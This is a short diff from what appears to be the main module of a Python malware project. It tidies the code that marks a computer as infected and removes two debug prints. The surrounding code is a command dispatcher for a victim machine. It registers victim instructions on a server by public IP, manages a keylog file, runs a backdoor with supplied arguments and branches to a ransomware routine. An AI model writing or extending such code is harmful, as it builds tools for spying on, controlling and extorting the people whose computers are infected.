@@ -33,11 +33,9 @@ def main(start_module):
     # Computer is already infected
     if os.path.exists(NO_INFECTION_FILE):
         start_module = "instructions"
-
     # Creates a file for the propagation module to identify whether a computer is already infected or not
-    if not (os.path.exists(NO_INFECTION_FILE)):
-        with open(NO_INFECTION_FILE, "w") as file:
-            pass
+    else:
+        with open(NO_INFECTION_FILE, "w") as file: pass
 
     # Creates a instructions file on the server for this specific victim
     instructions.create_victim_instruction(PUBLIC_IP)
@@ -78,9 +76,7 @@ def main(start_module):
                     instructions.reset_keylog_file()
 
             elif result[0] == "backdoor":
-                print("test1")
                 if len(result) >= 3:
-                    print("test2")
                     backdoor.run(result[1], result[2])
 
             elif result[0] == "ransomware":
